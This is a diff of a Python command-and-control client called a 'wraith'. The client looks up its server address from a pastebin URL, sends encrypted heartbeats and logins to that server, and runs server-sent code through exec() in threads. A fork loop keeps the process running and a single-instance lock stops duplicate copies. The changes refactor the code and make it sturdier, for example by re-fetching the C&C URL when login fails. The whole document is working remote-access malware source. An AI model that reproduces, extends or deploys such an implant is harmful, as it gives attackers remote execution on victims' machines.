@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# Import libraries
+
 from aes import AesEncryption as aes  # From the same dir as this file
 import requests
 import threading
@@ -17,7 +17,7 @@ import os
 import subprocess
 from uuid import getnode as get_mac
 
-# Get start time of this wraith
+
 start_time = time.time()
 
 # START CONSTANTS
@@ -25,10 +25,10 @@ start_time = time.time()
 # Define some constants
 # The URL where the URL of the C&C server is found. This option was added
 # to allow the C&C URL to change without having to re-install all wraiths
-FETCH_SERVER_LOCATION_URL = "https://pastebin.com/raw/dAUvxiQb"
+FETCH_SERVER_LOCATION_URL = "https://pastebin.com/raw/a4B2cfwY"
 # A key used to encrypt the first packet before a new key is sent over by the
-# server. Not the most secure communication, I know. Any replacement welcome.
-# However, wraiths can work over SSL and so can the panel so the security
+# server. Not the most secure communication, I know. However, wraiths can
+# (and should) work over SSL and so can the panel so the security
 # of this system is not critical
 CRYPT_KEY = "G39UHG83H2F92JC9H92VJ29W9HCG9WMHG2F1ZE10SKXQCSPKNXKZNBDCOG0Y"
 # The fingerprint of the server to trust. This prevents the wraith from
@@ -40,17 +40,17 @@ TRUSTED_SERVER = "VWIVWNODCOWQPSPL"
 NON_DUPLICATE_CHECK_PORT = 47402
 # Whether to log the interactions with the server to the console.
 # Not recommended except for debugging
-INTERACTION_LOGGING = True
+INTERACTION_LOGGING = False
 
 # END CONSTANTS
 
-# Now, we fork :)
+# Fork and watch the child. Restart if it exits
 """
 while True:
     # This spawns a child process. The parent will monitor the child
     # and re-start it if it exits
     pid = os.fork()
-    # If this is not the child process (is parent process), start monitoring
+    # If this is not the child process (is parent), start monitoring
     # child and re-start it in case of failure
     if pid != 0:
         try:
@@ -66,15 +66,11 @@ single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
 except: sys.exit(0)
 
-# Init crypt
+
 aes = aes()
 
-# Get the address of the wraith API
-connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text
 
-# Create a class for the wraith
-class Wraith(object):
-    # When the wraith is created
+class Wraith():
     def __init__(self, api_url, CRYPT_KEY, crypt_obj):
         self.id = None # Will be replaced with server-assigned UUID on login
         self.api_url = api_url # Create a local copy of the API url
@@ -88,26 +84,33 @@ class Wraith(object):
 
     # Make requests to the api and return responses
     def api(self, data_dict):
-        # If we are meant to log interactions, log
-        if INTERACTION_LOGGING: print("\n[CLIENT]:\n"+json.dumps(data_dict)+"\n")
+        # If we are meant to log interactions, log (debug)
+        if INTERACTION_LOGGING: print(f"\n[CLIENT]:\n{json.dumps(data_dict)}\n")
         # Create the encrypted data string
         data = self.crypt.encrypt(json.dumps(data_dict), self.CRYPT_KEY).decode()
         # Generate a prefix for ID and security purposes
-        prefix=("".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(5)])+"Wr7H")
-        # Send the data using a HTTP POST request and get the response (only text, don't need headers)
-        try: response = requests.post(connect_url, data=prefix+data).text.encode()
-        # If for some reason the request failed, return False
+        prefix = ("".join([random.choice(
+            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+            ) for i in range(5)])+"Wr7H")
+        # Send the data using a HTTP POST request and get the response
+        # (only text, don't need headers)
+        try:
+            response = requests.post(connect_url, data=prefix+data).text.encode()
+        # If for some reason the request failed
         except: return False
         # Attempt to decrypt the response with the crypt object and key
         response_is_crypt = True
         try: response = self.crypt.decrypt(response, self.CRYPT_KEY)
-        # If this fails, the message must be unencrypted. Ignore the err and try to JSON decode
+        # If this fails, the message must be unencrypted.
+        # Ignore the err and try to JSON decode
         except: response_is_crypt = False
         try:
             response = json.loads(response)
-            # If we are meant to log, log
-            if INTERACTION_LOGGING: print("\n[SERVER]:\n"+json.dumps(response)+"\nISCRYPT: {}\n".format(response_is_crypt))
-            # If all worked out well, return the response as a dict. If something failed, return False
+            # If we are meant to log, log (debug)
+            if INTERACTION_LOGGING:
+                print(f"\n[SERVER]:\n{json.dumps(response)}\nISCRYPT: {response_is_crypt}\n")
+            # If all worked out well, return the response as a dict.
+            # If something failed, return False
             return response
         except: return False
 
@@ -138,7 +141,8 @@ class Wraith(object):
         if isinstance(response, type({})) and response["status"] == "SUCCESS":
             # If the server did not identify itself correctly, fail
             if response["server_id"] != TRUSTED_SERVER: return False
-            # Save given ID as wraith ID. We'll identify ourselves with it from now on
+            # Save given ID as wraith ID. We'll identify ourselves
+            # with it from now on
             self.id = response["wraith_id"]
             # If we're told to switch encryption keys, switch
             if "switch_key" in response.keys():
@@ -165,12 +169,16 @@ class Wraith(object):
         # Send the request
         response = self.api(data)
         # Check the data received back
-        if type(response) == type({}) and response["status"] == "SUCCESS" and "command_queue" in response.keys():
+        if isinstance(response, type({})) and response["status"] == "SUCCESS" and "command_queue" in response.keys():
             # If the server did not identify itself correctly, fail
             if response["server_id"] != TRUSTED_SERVER: return False
-            # Append commands to queue
-            for command in response["command_queue"]:
-                self.command_queue.append(command)
+            # Append commands to queue (if queue is empty, = will suffice, else
+            # append)
+            if len(self.command_queue) == 0:
+                self.command_queue = response["command_queue"]
+            else:
+                for command in response["command_queue"]:
+                    self.command_queue.append(command)
             # If we're told to switch encryption keys, switch
             if "switch_key" in response.keys():
                 self.CRYPT_KEY = response["switch_key"]
@@ -202,11 +210,12 @@ class Wraith(object):
     def run_commands(self):
         for cmd in self.command_queue:
             try:
-                # Remove the command from the list
                 self.command_queue.remove(cmd)
-                # Define a scope for the exec call so the script_main function can be used later
+                # Define a scope for the exec call so the script_main function
+                # can be used later
                 exec_scope = locals()
-                # Define a script_main function to prevent errors in case of incorrectly formatted modules
+                # Define a script_main function to prevent errors in case of
+                # incorrectly formatted modules
                 exec_scope["script_main"] = lambda a, b: 0
                 # This should define the script_main function
                 exec(cmd[1], globals(), exec_scope)
@@ -216,34 +225,40 @@ class Wraith(object):
                     cmd[0]
                 ))
                 # Notify the server that we are now executing the command
-                self.putresult("SUCCESS", "Executing `{}`".format(cmd[0]))
+                self.putresult("SUCCESS", f"Executing `{cmd[0]}`")
                 # Execute the command
                 script_thread.start()
             except Exception as e:
                 # If there was an error, report it to the server
-                self.putresult("ERROR - {}".format(e), "Error while executing `{}`".format(cmd[0]))
+                self.putresult(f"ERROR - {e}", f"Error while executing `{cmd[0]}`")
 
     # Indefinitely run `run_commands`
     def run_commands_thread(self):
         while True: self.run_commands()
 
-# Create an instance of wraith
-wraith = Wraith(connect_url, CRYPT_KEY, aes)
 
-# Start sending heartbeats
-# It's ok not to login beforehand as heartbeat will fail and the wraith will
-# log in when it does
+# Get the address of the wraith API
+connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text
+
+
+wraith = Wraith(connect_url, CRYPT_KEY, aes)
 
 # TODO retry timeout and restart
 # TODO robust server error handling
 
+# Start sending heartbeats
+# It's ok not to login beforehand as heartbeat will fail and the wraith will
+# log in when it does
 while True:
     # If the heartbeat fails for some reason (implicitly execute heartbeat)
     if not wraith.heartbeat():
         # Switch to default key in case switch_key was applied
         wraith.CRYPT_KEY = CRYPT_KEY
-        # Try login every 10 seconds until it works
-        while not wraith.login(): time.sleep(10)
+        # Try login every 10 seconds until it works. Also, re-fetch the API url
+        # in case the old one is no longer active and was updated
+        while not wraith.login():
+            time.sleep(10)
+            wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
         # Continue to the next loop (re-send heartbeat)
         continue
 
